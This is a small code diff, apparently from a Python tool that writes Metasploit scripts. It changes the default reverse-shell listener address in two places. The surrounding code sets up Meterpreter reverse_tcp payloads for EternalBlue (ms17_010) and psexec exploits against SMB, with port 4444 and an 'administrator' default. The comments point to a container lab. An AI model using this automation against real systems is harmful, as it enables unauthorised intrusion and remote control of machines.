@@ -971,7 +971,7 @@ set RPORT {port}
                 script += f"set PAYLOAD {payload}\n"
                 
                 # LHOST et LPORT pour reverse shell
-                script += f"set LHOST {options.get('LHOST', '172.20.0.1')}\n"  # IP du conteneur
+                script += f"set LHOST {options.get('LHOST', '172.20.0.2')}\n"  # IP du conteneur
                 script += f"set LPORT {options.get('LPORT', '4444')}\n"
         
         # ✅ GESTION POUR SMB EXPLOITS
@@ -979,7 +979,7 @@ set RPORT {port}
             if 'eternalblue' in exploit_module or 'ms17_010' in exploit_module:
                 payload = options.get('PAYLOAD', 'windows/x64/meterpreter/reverse_tcp')
                 script += f"set PAYLOAD {payload}\n"
-                script += f"set LHOST {options.get('LHOST', '172.20.0.1')}\n"
+                script += f"set LHOST {options.get('LHOST', '172.20.0.2')}\n"
                 script += f"set LPORT {options.get('LPORT', '4444')}\n"
             elif 'psexec' in exploit_module:
                 script += f"set SMBUser {options.get('USERNAME', 'administrator')}\n"
